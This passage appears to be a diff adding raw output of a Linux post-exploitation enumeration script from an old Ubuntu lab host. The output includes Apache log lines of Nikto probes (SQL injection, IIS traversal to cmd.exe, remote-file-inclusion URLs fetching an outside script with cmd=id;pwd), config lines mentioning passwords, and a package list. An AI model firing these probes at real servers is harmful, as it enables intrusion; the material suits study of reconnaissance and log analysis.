+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:24 -0500] "GET /spwd HTTP/1.1" 404 286 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:001856)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:24 -0500] "GET /cgi-bin/password HTTP/1.1" 404 298 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002025)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:27 -0500] "GET /protectedpage.php?uid=&#039;%20OR%20&#039;&#039;=&#039;&amp;pwd=&#039;%20OR%20&#039;&#039;=&#039; HTTP/1.1" 404 299 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002573)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:27 -0500] "GET /cgi-bin/change-your-password.pl HTTP/1.1" 404 313 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002662)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:29 -0500] "GET /_vti_pvt/administrators.pwd HTTP/1.1" 404 309 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002857)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:29 -0500] "GET /_vti_pvt/authors.pwd HTTP/1.1" 404 302 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002858)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:29 -0500] "GET /_vti_pvt/service.pwd HTTP/1.1" 404 302 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002859)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:29 -0500] "GET /_vti_pvt/users.pwd HTTP/1.1" 404 300 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:002860)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:31 -0500] "GET /proxy/ssllogin?user=administrator&password=administrator HTTP/1.1" 404 296 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003105)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:31 -0500] "GET /proxy/ssllogin?user=administrator&password=operator HTTP/1.1" 404 296 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003106)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:31 -0500] "GET /proxy/ssllogin?user=administrator&password=user HTTP/1.1" 404 296 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003107)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:31 -0500] "GET /banmat.pwd HTTP/1.1" 404 292 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003163)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:31 -0500] "GET /iisadmpwd/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 321 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003192)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:32 -0500] "GET /iisadmpwd/..%255c..%255cwinnt/system32/cmd.exe?/c+dir HTTP/1.1" 404 324 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:003296)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:37 -0500] "GET /admin/admin_forgotten_password.php?root_folder_path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 316 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004078)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:38 -0500] "GET /arab3upload/customize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd HTTP/1.1" 404 307 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004247)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:38 -0500] "GET /arab3upload/initialize.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd HTTP/1.1" 404 308 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004248)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:46 -0500] "GET /ezusermanager_pwd_forgott.php?ezUserManager_Path=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 311 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004724)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:47 -0500] "GET /form.php?path=http://cirt.net/rfiinc.txt??&cmd=pwd HTTP/1.1" 404 290 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004765)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:20:47 -0500] "GET /forum/lostpassword.php?repertorylevel=http://cirt.net/rfiinc.txt?? HTTP/1.1" 404 304 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:004770)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:21:06 -0500] "GET /support/include/open_form.php?include_dir=http://cirt.net/rfiinc.txt??cmd=pwd HTTP/1.1" 404 311 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005901)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:21:06 -0500] "GET /template/barnraiser_01/p_new_password.tpl.php?templatePath=http://cirt.net/rfiinc.txt? HTTP/1.1" 404 327 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:005933)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:21:07 -0500] "GET /usr/extensions/get_infochannel.inc.php?root_path=http://cirt.net/rfiinc.txt??cmd=id;pwd HTTP/1.1" 404 320 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006019)"
+    /var/log/apache2/access.log:192.168.1.105 - - [22/Nov/2026:19:21:07 -0500] "GET /usr/extensions/get_tree.inc.php?GLOBALS[\\\"root_path\\\"]=http://cirt.net/rfiinc.txt??cmd=id;pwd HTTP/1.1" 404 313 "-" "Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:006020)"
+
+[+] Config files containing keyword 'password'
+    /etc/mysql/my.cnf:# It has been reported that passwords should be enclosed with ticks/quotes
+    /etc/mysql/conf.d/old_passwords.cnf:old_passwords = false
+    /etc/debconf.conf:# World-readable, and accepts everything but passwords.
+    /etc/debconf.conf:Reject-Type: password
+    /etc/debconf.conf:# Not world readable (the default), and accepts only passwords.
+    /etc/debconf.conf:Name: passwords
+    /etc/debconf.conf:Accept-Type: password
+    /etc/debconf.conf:Filename: /var/cache/debconf/passwords.dat
+    /etc/debconf.conf:# databases, one to hold passwords and one for everything else.
+    /etc/debconf.conf:Stack: config, passwords
+    /etc/debconf.conf:# A remote LDAP database. It is also read-only. The password is really
+    /etc/samba/smb.conf:# You may wish to use password encryption.  See the section on
+    /etc/samba/smb.conf:# 'encrypt passwords' in the smb.conf(5) manpage before enabling.
+    /etc/samba/smb.conf:   encrypt passwords = true
+    /etc/samba/smb.conf:# If you are using encrypted passwords, Samba will need to know what
+    /etc/samba/smb.conf:# password database type you are using.
+    /etc/samba/smb.conf:# password with the SMB password when the encrypted SMB password in the
+    /etc/samba/smb.conf:;   unix password sync = no
+    /etc/samba/smb.conf:# For Unix password sync to work on a Debian GNU/Linux system, the following
+    /etc/samba/smb.conf:   passwd chat = *Enter\snew\sUNIX\spassword:* %n\n *Retype\snew\sUNIX\spassword:* %n\n .
+    /etc/samba/smb.conf:# This boolean controls whether PAM will be used for password changes
+    /etc/samba/smb.conf:;   pam password change = no
+    /etc/ltrace.conf:; pwd.h
+    /etc/proftpd/proftpd.conf:# Uncomment this if you are using NIS or LDAP via NSS to retrieve passwords:
+    /etc/proftpd/proftpd.conf:# This is required to use both PAM-based authentication and local passwords
+    /etc/proftpd/sql.conf:# Use both a crypted or plaintext password
+    /etc/proftpd/sql.conf:# Use a backend-crypted or a crypted password
+    /etc/proftpd/sql.conf:#SQLConnectInfo proftpd@sql.example.com proftpd_user proftpd_password
+    /etc/proftpd/ldap.conf:#LDAPDNInfo "cn=admin,dc=example,dc=com" "admin_password"
+    /etc/proftpd/ldap.conf:#LDAPDNInfo "cn=admin,dc=example,dc=com" "admin_password"
+    /etc/hdparm.conf:# --security-set-pass Set security password
+    /etc/hdparm.conf:# security_pass = password
+    /etc/hdparm.conf:# --user-master Select password to use
+    /etc/devscripts.conf:# options may be used to specify the username and password to use.
+    /etc/devscripts.conf:# If only a username is provided then the password will be prompted for
+    /etc/ssl/openssl.cnf:# input_password = secret
+    /etc/ssl/openssl.cnf:# output_password = secret
+    /etc/ssl/openssl.cnf:challengePassword		= A challenge password
+    /etc/postgresql/8.3/main/postgresql.conf:#password_encryption = on
+    /etc/cowpoke.conf:# using a simple password (or worse, a normal user password), then you can
+
+[+] Shadow File (Privileged)
+
+[*] ENUMERATING PROCESSES AND APPLICATIONS...
+
+[+] Installed Packages
+    Status=Not/Installed/Config-f/Unpacked/Failed-cfg/Half-inst/t-aWait/T-pend
+    Err?=(none)/Hold/Reinst-required/X=both-problems (Status,Err:
+    Name Version
+    adduser 3.105ubuntu1  and remove users and groups
+    ant 1.7.0-3  based build tool like make
+    antlr 2.7.6-10  tool for constructing recognizers,
+    apache2 2.2.8-1  generation, scalable, extendable web se
+    apache2-mpm-prefork 2.2.8-1ubuntu0.15  model for Apache HTTPD
+    apache2-utils 2.2.8-1ubuntu0.15  programs for webservers
+    apache2.2-common 2.2.8-1ubuntu0.15  generation, scalable, extendable web se
+    apparmor 2.1+1075-0ubuntu9  parser utility for AppArmor
+    apparmor-utils 2.1+1075-0ubuntu9  for controlling AppArmor
+    apt 0.7.9ubuntu17  front-end for dpkg
+    apt-utils 0.7.9ubuntu17  utility programs
+    aptitude 0.4.9-2ubuntu5  package manager
+    at 3.1.10ubuntu4  job execution and batch processing
+    autoconf 2.61-4  configure script builder
+    autoconf2.59 2.59-1  configure script builder (obsolete
+    base-files 4.0.1ubuntu5  base system miscellaneous files
+    base-passwd 3.5.16  base system master password and group
+    bash 3.2-0ubuntu16  GNU Bourne Again SHell
+    bash-completion 20060301-3ubuntu3  completion for the bash shell
+    belocs-locales-bin 2.4-2.2ubuntu7  for compiling locale data files
+    bind9 1:9.4.2-10  Domain Name Server
+    bind9-host 1:9.4.2-10  of 'host' bundled with BIND 9.X
+    binutils 2.18.1~cvs20080103-0ubuntu1  GNU assembler, linker and binary utiliti
+    bsdmainutils 6.1.10ubuntu2  of more utilities from FreeBSD
+    bsdutils 1:2.13.1-5ubuntu1  utilities from 4.4BSD-Lite
+    busybox-initramfs 1:1.1.3-5ubuntu12  shell setup for initramfs
+    bzip2 1.0.4-2ubuntu4  block-sorting file compressor -
+    comerr-dev 2.1-1.40.8-2ubuntu2  error description library - headers a
+    command-not-found 0.2.17ubuntu1  installation of packages in interact
+    command-not-found-data 0.2.17ubuntu1  of data files for command-not-found.
+    console-setup 1.21ubuntu8  up the font and the keyboard on the cons
+    console-terminus 4.20-6  fonts for fast reading on the Li
+    console-tools 1:0.2.3dbs-65ubuntu7  console and font utilities
+    coreutils 6.10-3ubuntu2  GNU core utilities
+    cpio 2.9-6ubuntu1  cpio -- a program to manage archives of
+    cpp 4:4.2.3-1ubuntu6  GNU C preprocessor (cpp)
+    cpp-4.2 4.2.4-1ubuntu4  GNU C preprocessor
+    cron 3.0pl1-100ubuntu2  of regular background processing
+    curl 7.18.0-1ubuntu2.3  a file from an HTTP, HTTPS or FTP server
+    dash 0.5.4-8ubuntu1  shell
+    debconf 1.5.20  configuration management system
+    debconf-i18n 1.5.20  internationalization support for debcon
+    debhelper 7.0.13ubuntu1~hardy1  programs for debian/rules
+    debianutils 2.28.2-0ubuntu1  utilities specific to Debian
+    defoma 0.11.10-0.2  Font Manager -- automatic font config
+    devscripts 2.10.39ubuntu2~hardy1  to make the life of a Debian Package
+    dhcp3-client 3.0.6.dfsg-1ubuntu9  client
+    dhcp3-common 3.0.6.dfsg-1ubuntu9  files used by all the dhcp3* packages
+    diff 2.8.1-12ubuntu1  comparison utilities
+    diffstat 1.45-2  graph of changes introduced by a di
+    distcc 2.18.3-4.1ubuntu1  distributed compiler client and serve
+    dmidecode 2.9-1ubuntu1  Desktop Management Interface data
+    dmsetup 2:1.02.20-2ubuntu2  Linux Kernel Device Mapper userspace lib
+    dnsutils 1:9.4.2-10  provided with BIND
+    dosfstools 2.11-2.3ubuntu1  to create and check MS-DOS FAT fil
+    dpkg 1.14.16.6ubuntu3  maintenance system for Debian
+    dpkg-dev 1.14.16.6ubuntu4.1  building tools for Debian
+    e2fslibs 1.40.8-2ubuntu2  filesystem libraries
+    e2fsprogs 1.40.8-2ubuntu2  file system utilities and libraries
+    ecj 3.3.0+0728-5  version of the Eclipse Java compi
+    ecj-gcj 3.3.0+0728-5  version of the Eclipse Java compi
+    ed 0.7-1ubuntu1  classic unix line editor
+    eject 2.1.5-6  CDs and operates CD-Changers under Li
+    esound-common 0.2.38-0ubuntu9  Sound Daemon - Common files
+    eterm 0.9.4.0debian1-2ubuntu3  Terminal Emulator
+    ethtool 6-0  or change ethernet card settings
+    fakeroot 1.9ubuntu1.1  a fake root environment
+    fastjar 2:0.95-1ubuntu2  creation utility
+    fdutils 5.5-20060227-1.1  floppy utilities
+    figlet 2.2.2-1ubuntu1  Ian & Glenn's Letters
+    file 4.21-3  file type using "magic" numbers
+    filezilla 3.0.11.1-0ubuntu1~hardy1  of the famous Win32 graphical FTP clien
+    filezilla-common 3.0.11.1-0ubuntu1~hardy1  independent files for filezilla
+    findutils 4.2.32-1ubuntu2  for finding files--find, xargs
+    firefox 3.6.17+build3+nobinonly-0ubuntu0.8.04.1  and easy web browser from Mozilla
+    firefox-3.0 3.6.17+build3+nobinonly-0ubuntu0.8.04.1  upgrade package for firefox-3.0 -> fir
+    firefox-branding 3.6.17+build3+nobinonly-0ubuntu0.8.04.1  that ships the firefox branding
+    fluxbox 1.1.1-1~hardy1  configurable and low resource X11 Win
+    fontconfig 2.5.0-2ubuntu3  font configuration library - support
+    fontconfig-config 2.5.0-2ubuntu3  font configuration library - configu
+    friendly-recovery 0.1  recovery more user-friendly
+    ftp 0.17-16build1  FTP client
+    ftpd 0.17-27  server
+    fuse-utils 2.7.2-1ubuntu2  in USErspace (utilities)
+    g++ 4:4.2.3-1ubuntu6  GNU C++ compiler
+    g++-4.2 4.2.4-1ubuntu4  GNU C++ compiler
+    gappletviewer-4.2 4.2.4-1ubuntu3  application to execute Java (tm)
+    gcc 4:4.2.3-1ubuntu6  GNU C compiler
+    gcc-4.2 4.2.4-1ubuntu4  GNU C compiler
+    gcc-4.2-base 4.2.4-1ubuntu4  GNU Compiler Collection (base package)
+    gcj-4.2 4.2.4-1ubuntu3  GNU compiler for Java(TM)
+    gcj-4.2-base 4.2.4-1ubuntu3  GNU Compiler Collection (gcj base packag
+    gconf2 2.22.0-0ubuntu3  configuration database system (support
+    gconf2-common 2.22.0-0ubuntu3  configuration database system (common
+    gdb 6.8-1ubuntu3  GNU Debugger
+    gettext 0.17-2ubuntu1  Internationalization utilities
+    gettext-base 0.17-2ubuntu1  Internationalization utilities for the b
+    gij 4:4.2.3-1ubuntu6  GNU Java bytecode interpreter
+    gij-4.2 4.2.4-1ubuntu3  GNU Java bytecode interpreter
+    gjdoc 0.7.8-6  generation framework for java
+    gnupg 1.4.6-2ubuntu5  privacy guard - a free PGP replacement
+    gpgv 1.4.6-2ubuntu5  privacy guard - signature verification t
+    grep 2.5.3~dfsg-3  grep, egrep and fgrep
+    groff-base 1.18.1.1-16  troff text-formatting system (base syste
+    grub 0.97-29ubuntu21.2  Unified Bootloader
+    gzip 1.3.12-3.2  GNU compression utility
+    hdparm 8.6-1ubuntu1  hard disk parameters for high performan
+    hostname 2.94  to set/show the host name or domain
+    html2text 1.3.2a-3build2  advanced HTML to text converter
+    ifupdown 0.6.8ubuntu8  level tools to configure network interf
+    info 4.11.dfsg.1-4  GNU Info documentation browser
+    initramfs-tools 0.85eubuntu36  for generating an initramfs
+    initscripts 2.86.ds1-14.1ubuntu45  for initializing and shutting down t
+    inputattach 1.23-0ubuntu2  to attach serial devices to the inpu
+    installation-report 2.31ubuntu1  installation report
+    intltool-debian 0.35.0+20060710.1  i18n of RFC822 compliant config files
+    iproute 20071016-2ubuntu1  tools to control the networking
+    iptables 1.3.8.0debian1-1ubuntu2  tools for packet filtering an
+    iputils-arping 3:20071127-1  to send ICMP echo requests to an ARP ad
+    iputils-ping 3:20071127-1  to test the reachability of network ho
+    iputils-tracepath 3:20071127-1  to trace the network path to a remote
+    java-common 0.28ubuntu3  of all Java packages
+    java-gcj-compat 1.0.77-2ubuntu2  runtime environment using GIJ
+    java-gcj-compat-dev 1.0.77-2ubuntu2  runtime environment with GCJ
+    java-gcj-compat-headless 1.0.77-2ubuntu2  runtime environment using GIJ (headless
+    jsvc 1.0.2~svn20061127-6  to launch Java applications as daemo
+    klibc-utils 1.5.7-4ubuntu3  statically-linked utilities built with
+    klogd 1.5-1ubuntu1  Logging Daemon
+    laptop-detect 0.13.2ubuntu1  to detect a laptop
+    less 418-1  program similar to more
+    libacl1 2.2.45-1  control list shared library
+    libapache2-mod-php5 5.2.4-2ubuntu5.24  HTML-embedded scripting languag
+    libapr1 1.2.11-1  Apache Portable Runtime Library
+    libaprutil1 1.2.12+dfsg-3  Apache Portable Runtime Utility Library
+    libasound2 1.0.15-3ubuntu4  library
+    libaspell15 0.60.5-1ubuntu2  Aspell spell-checker runtime library
+    libast2 0.7-2  Library of Assorted Spiffy Things
+    libatk1.0-0 1.22.0-0ubuntu1  ATK accessibility toolkit
+    libatm1 2.4.1-17.1build1  library for ATM (Asynchronous Transfe
+    libattr1 1:2.4.39-1  attribute shared library
+    libaudiofile0 0.2.6-7ubuntu1.8.04.1  version of SGI's audiofile libra
+    libavahi-client3 0.6.22-2ubuntu4.3  client library
+    libavahi-common-data 0.6.22-2ubuntu4.3  common data files
+    libavahi-common3 0.6.22-2ubuntu4.3  common library
+    libavahi-glib1 0.6.22-2ubuntu4.3  glib integration library
+    libbcel-java 5.2-3ubuntu1  create, and manipulate (binary) Jav
+    libbind9-30 1:9.4.2-10  Shared Library used by BIND
+    libblkid1 1.40.8-2ubuntu2  device id library
+    libbz2-1.0 1.0.4-2ubuntu4  block-sorting file compressor l
+    libc6 2.7-10ubuntu5  C Library: Shared libraries
+    libc6-dev 2.7-10ubuntu5  C Library: Development Libraries and Hea
+    libc6-i686 2.7-10ubuntu5  C Library: Shared libraries [i686 optimi
+    libcairo2 1.6.0-0ubuntu2  Cairo 2D vector graphics library
+    libcap1 1:1.10-14build1  for getting/setting POSIX.1e capabil
+    libchromexvmc1 1:0.2.901-0ubuntu4  Libraries used by the Openchrome VIA dr
+    libchromexvmcpro1 1:0.2.901-0ubuntu4  Pro Libraries used by the Openchrome VI
+    libck-connector0 0.2.3-3ubuntu5  libraries
+    libcomerr2 1.40.8-2ubuntu2  error description library
+    libcommons-beanutils-java 1.8.0~beta-1  for manipulating JavaBeans
+    libcommons-collections-java 2.1.1-8  set of abstract data type interfaces and i
+    libcommons-collections3-java 3.1a-3.1  set of abstract data type interfaces and i
+    libcommons-daemon-java 1.0.2~svn20061127-6  to launch Java applications as daemo
+    libcommons-dbcp-java 1.2.2-1  Connection Pooling Services
+    libcommons-digester-java 1.8-1  based XML Java object mapping tool
+    libcommons-el-java 1.0-4  of the JSP2.0 Expression Lang
+    libcommons-fileupload-java 1.2-2  upload capability to your servlets and
+    libcommons-io-java 1.3.2-2  useful IO related classes
+    libcommons-launcher-java 1.1-3  platform java application launcher
+    libcommons-logging-java 1.1-1ubuntu1  wrapper interface for several loggin
+    libcommons-modeler-java 2.0.1-4  library to use Java Management E
+    libcommons-pool-java 1.3-1  implementation for Java objects
+    libcommons-validator-java 1:1.3.1-1  and speed development and maintenance o
+    libconsole 1:0.2.3dbs-65ubuntu7  libraries for Linux console and font
+    libcupsys2 1.3.7-1ubuntu3.9  UNIX Printing System(tm) - libs
+    libcurl3 7.18.0-1ubuntu2.3  file transfer library (OpenSS
+    libcurl3-gnutls 7.18.0-1ubuntu2  file transfer library (GnuTLS
+    libcurl4-openssl-dev 7.18.0-1ubuntu2.3  files and documentation for libc
+    libcwidget3 0.5.8-1ubuntu1  terminal interface library for C+
+    libdatrie0 0.1.2-2  trie library
+    libdb4.6 4.6.21-6ubuntu1  v4.6 Database Libraries [runtime]
+    libdbd-mysql-perl 4.005-1  Perl5 database interface to the MySQL data
+    libdbi-perl 1.601-1  database interface by Tim Bunce
+    libdbus-1-3 1.1.20-1ubuntu1  interprocess messaging system
+    libdbus-glib-1-2 0.74-2ubuntu0.1  interprocess messaging system (GLib-b
+    libdevmapper1.02.1 2:1.02.20-2ubuntu2  Linux Kernel Device Mapper userspace lib
+    libdns32 1:9.4.2-10  Shared Library used by BIND
+    libdrm2 2.3.0-4ubuntu1  interface to kernel DRM services -
+    libecj-java 3.3.0+0728-5  Java compiler (library)
+    libecj-java-gcj 3.3.0+0728-5  Java compiler (native library)
+    libedit2 2.9.cvs.20050518-4  editline and history libraries
+    libelfg0 0.8.6-4  ELF object file access library
+    libesd-alsa0 0.2.38-0ubuntu9  Sound Daemon (ALSA) - Shared lib
+    libevent1 1.3e-1  asynchronous event notification library
+    libexpat1 2.0.1-0ubuntu1  parsing C library - runtime library
+    libfontconfig1 2.5.0-2ubuntu3  font configuration library - runtime
+    libfontenc1 1:1.0.4-2  font encoding library
+    libfreetype6 2.3.5-1ubuntu4.8.04.2  2 font engine, shared library files
+    libfribidi0 0.10.9-1  Implementation of the Unicode BiDi algo
+    libfs6 2:1.0.0-4ubuntu2  Font Services library
+    libfuse2 2.7.2-1ubuntu2  in USErspace library
+    libgadu3 1:1.7~rc2-2ubuntu0.8.04.1  protocol library - runtime files
+    libgc1c2 1:6.8-1.1  garbage collector for C and C++
+    libgcc1 1:4.2.4-1ubuntu4  support library
+    libgcj-bc 4.2.3-1ubuntu6  time only library for use with gcj
+    libgcj-common 1:4.2.3-1ubuntu6  runtime library (common files)
+    libgcj8-1 4.2.4-1ubuntu3  runtime library for use with gcj
+    libgcj8-1-awt 4.2.4-1ubuntu3  peer runtime libraries for use with gcj
+    libgcj8-dev 4.2.4-1ubuntu3  development headers for use with gcj
+    libgcj8-jar 4.2.4-1ubuntu3  runtime library for use with gcj (jar f
+    libgconf2-4 2.22.0-0ubuntu3  configuration database system (shared
+    libgcrypt11 1.2.4-2ubuntu7  Crypto library - runtime library
+    libgd2-xpm 2.0.35.dfsg-3ubuntu2.1  Graphics Library version 2
+    libgdbm3 1.8.3-3  dbm database routines (runtime version)
+    libgif4 4.1.6-4  for GIF images (library)
+    libgl1-mesa-glx 7.0.3~rc2-1ubuntu3  free implementation of the OpenGL API -- G
+    libglib2.0-0 2.16.6-0ubuntu1.2  GLib library of C routines
+    libglu1-mesa 7.0.3~rc2-1ubuntu3  OpenGL utility library (GLU)
+    libgnutls13 2.0.4-1ubuntu2  GNU TLS library - runtime library
+    libgomp1 4.2.4-1ubuntu4  OpenMP (GOMP) support library
+    libgpg-error0 1.4-2ubuntu7  for common error values and messages
+    libgpmg1 1.19.6-25ubuntu1  Purpose Mouse - shared library
+    libgssglue1 0.1-1  gssapi library
+    libgstreamer-plugins-base0.10-0 0.10.18-3  libraries from the "base" set
+    libgstreamer0.10-0 0.10.18-4ubuntu2  GStreamer libraries and elements
+    libgtk2.0-0 2.12.9-3ubuntu5  GTK+ graphical user interface library
+    libgtk2.0-common 2.12.9-3ubuntu5  files for the GTK+ graphical user int
+    libgtkspell0 2.0.10-4  spell-checking addon for GTK's TextView wi
+    libhal1 0.5.11~rc2-1ubuntu8.3  Abstraction Layer - shared library
+    libhesiod0 3.0.2-18.1  for hesiod, a service name resolut
+    libhtml-parser-perl 3.56-1  collection of modules that parse HTML text
+    libhtml-tagset-perl 3.10-2  tables pertaining to HTML
+    libhtml-tree-perl 3.23-1  and create HTML syntax trees
+    libice6 2:1.0.4-1  Inter-Client Exchange library
+    libid3tag0 0.15.1b-10  tag reading library from the MAD project
+    libidl0 0.8.10-0.1  for parsing CORBA IDL files
+    libidn11 1.1-1  libidn library, implementation of IETF I
+    libidn11-dev 1.1-1  files GNU libidn, implementation
+    libimlib2 1.4.0-1ubuntu1.2  image loading and rendering library
+    libisc32 1:9.4.2-10  Shared Library used by BIND
+    libisccc30 1:9.4.2-10  Channel Library used by BIND
+    libisccfg30 1:9.4.2-10  File Handling Library used by BIND
+    libiw29 29-1ubuntu2  tools - library
+    libjaxp1.3-java 1.3.04-2  XML parser and transformer APIs (DOM, S
+    libjpeg62 6b-14  Independent JPEG Group's JPEG runtime li
+    libkadm55 1.6.dfsg.3~beta1-2ubuntu1.8  Kerberos administration runtime librarie
+    libkeyutils1 1.2-4  Key Management Utilities (library)
+    libklibc 1.5.7-4ubuntu3  libc subset for use with initramfs
+    libkrb5-dev 1.6.dfsg.3~beta1-2ubuntu1.8  and development libraries for MIT Ke
+    libkrb53 1.6.dfsg.3~beta1-2ubuntu1.8  Kerberos runtime libraries
+    liblaunchpad-integration1 0.1.19  for launchpad integration
+    libldap-2.4-2 2.4.9-0ubuntu0.8.04.3  libraries
+    libldap2-dev 2.4.9-0ubuntu0.8.04.3  development libraries
+    liblocale-gettext-perl 1.05-2ubuntu1  libc functions for internationalizatio
+    liblog4j1.2-java 1.2.15-2  library for java
+    liblwres30 1:9.4.2-10  Resolver Library used by BIND
+    liblzo2-2 2.02-3  compression library
+    libmagic1 4.21-3  type determination library using "magic
+    libmeanwhile1 1.0.2-3  implementation of the Lotus Sametime Co
+    libmx4j-java 3.0.1-3  open source implementation of the JMX(TM)
+    libmysqlclient15off 5.0.51a-3ubuntu5  database client library
+    libncurses5 5.6+20071124-1ubuntu2  libraries for terminal handling
+    libncursesw5 5.6+20071124-1ubuntu2  libraries for terminal handling (wide
+    libnet-daemon-perl 0.38-1.1  module for building portable Perl daemo
+    libnewt0.52 0.52.2-11.2ubuntu1  Erik's Windowing Toolkit - text mode win
+    libnfsidmap2 0.20-0build1  nfs idmapping library
+    libnspr4-0d 4.8.6-0ubuntu0.8.04.1  Portable Runtime Library
+    libnss3-1d 3.12.9+ckbi-1.82-0ubuntu0.8.04.1  Security Service libraries
+    libntfs-3g23 1:1.2216-1ubuntu1  filesystem in userspace (FUSE) libra
+    libopencdk10 0.6.6-1ubuntu1  Crypto Development Kit (OpenCDK) (runti
+    liborbit2 1:2.14.12-0.1  for ORBit2 - a CORBA ORB
+    liboro-java 2.0.8a-3  expression library for Java
+    libpam-modules 0.99.7.1-5ubuntu6  Authentication Modules for PAM
+    libpam-runtime 0.99.7.1-5ubuntu6  support for the PAM library
+    libpam0g 0.99.7.1-5ubuntu6.1  Authentication Modules library
+    libpam0g-dev 0.99.7.1-5ubuntu6.1  files for PAM
+    libpango1.0-0 1.20.5-0ubuntu1.1  and rendering of internationalized te
+    libpango1.0-common 1.20.5-0ubuntu1.1  and configuration files for the Pang
+    libparted1.7-1 1.7.1-5.1ubuntu9  GNU Parted disk partitioning shared libr
+    libpcap0.8 0.9.8-2  interface for user-level packet captu
+    libpcre3 7.4-1ubuntu2  5 Compatible Regular Expression Library
+    libperl5.8 5.8.8-12ubuntu0.5  Perl library
+    libpixman-1-0 0.10.0-0ubuntu1  library for X and cairo
+    libplrpc-perl 0.2017-1.1  extensions for writing PlRPC servers an
+    libpng12-0 1.2.15~beta5-3ubuntu0.2  library - runtime
+    libpopt-dev 1.10-3build1  for parsing cmdline parameters - develop
+    libpopt0 1.10-3build1  for parsing cmdline parameters
+    libpq5 8.3.1-1  C client library
+    libpurple0 1:2.5.2-0ubuntu1.2~hardy1  instant messaging library
+    libreadline5 5.2-3build1  readline and history libraries, run-time
+    libregexp-java 1.4-4  expression library for Java
+    librpc-xml-perl 0.59-2  module implementation of XML-RPC
+    librpcsecgss3 0.17-1ubuntu2  secure rpc communication using the rp
+    libruby1.8 1.8.6.111-2ubuntu1.3  necessary to run Ruby 1.8
+    libsasl2-2 2.1.22.dfsg1-18ubuntu2  SASL - authentication abstraction libr
+    libsasl2-modules 2.1.22.dfsg1-18ubuntu2  SASL - pluggable authentication module
+    libselinux1 2.0.55-0ubuntu4  policy enforcement, run-time librari
+    libsepol1 2.0.20-0ubuntu3  binary policy, run-time library
+    libservlet2.3-java 4.0-10  2.3 and JSP 1.2 Java classes and doc
+    libservlet2.4-java 5.0.30-6ubuntu1  2.4 and JSP 2.0 Java library.
+    libsigc++-2.0-0c2a 2.0.17-2ubuntu3  Signal Framework for C++ - runtime
+    libsilc-1.1-2 1.1.5-1ubuntu1  library (silc-toolkit)
+    libslang2 2.1.3-2  S-Lang programming library - runtime ver
+    libsm6 2:1.0.3-1  Session Management library
+    libsqlite3-0 3.4.2-2  3 shared library
+    libss2 1.40.8-2ubuntu2  interface parsing library
+    libssl-dev 0.9.8g-4ubuntu3.18  development libraries, header files and
+    libssl0.9.8 0.9.8g-4ubuntu3.18  shared libraries
+    libstartup-notification0 0.9-1  for program launch feedback (shared
+    libstdc++6 4.2.4-1ubuntu4  GNU Standard C++ Library v3
+    libstdc++6-4.2-dev 4.2.4-1ubuntu4  GNU Standard C++ Library v3 (development
+    libstruts1.2-java 1.2.9-3  Framework for MVC web applications
+    libsysfs2 2.1.0-4  library to sysfs
+    libt1-5 5.1.1-5  1 font rasterizer library - runtime
